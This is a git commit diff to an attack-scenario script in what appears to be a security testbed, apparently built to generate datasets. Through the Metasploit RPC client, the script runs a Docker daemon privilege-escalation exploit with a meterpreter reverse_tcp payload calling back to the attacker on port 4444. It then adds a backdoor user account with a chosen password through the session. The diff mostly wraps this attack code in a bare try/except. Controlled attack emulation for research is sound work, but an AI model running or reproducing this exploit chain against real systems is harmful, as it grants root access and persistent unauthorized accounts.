b28295316aab92fe098c736f63f8e8758fa6e472
masjohncook <mas.john.cook@gmail.com>
2023-01-10 19:10:43 +0800

    dev - timestamp end point dos

--- CREME_backend_execution/scripts/02_scenario/05_end_point_dos/python_files/attacker_server/05_step_EndPointDos.py
+++ CREME_backend_execution/scripts/02_scenario/05_end_point_dos/python_files/attacker_server/05_step_EndPointDos.py
@@ -20,22 +20,26 @@ def main(argv):
     client = MsfRpcClient('kali')
 
 
-    time.sleep(60)
+    time.sleep(10)
     output_time_file_start = 'time_step_5_start.txt'
     record_timestamp(folder, output_time_file_start)
     time.sleep(60)
-    
-    exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
-    payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
-    exploit['SESSION'] = 1
-    payload['LHOST'] = my_ip
-    payload['LPORT'] = 4444
+    try:
+        exploit = client.modules.use('exploit', 'linux/local/docker_daemon_privilege_escalation')
+        payload = client.modules.use('payload', 'linux/x86/meterpreter/reverse_tcp')
+        exploit['SESSION'] = 1
+        payload['LHOST'] = my_ip
+        payload['LPORT'] = 4444
 
-    exploit.execute(payload=payload)
-    shell = client.sessions
-    #shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
-    # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
-    shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
+        exploit.execute(payload=payload)
+        shell = client.sessions
+        shell.run_with_output('shell', end_strs=None)  # end_strs=None means waiting until timeout
+        # shell.write('useradd -p $(openssl passwd -1 password) test') # cremetest:password
+        shell.write('useradd -p $(openssl passwd -1 {0}) {1}'.format(new_user_password, new_user_account))
+    
+    except:
+        pass
+    
     
     time.sleep(30)
     output_time_file_end = 'time_step_5_end.txt'
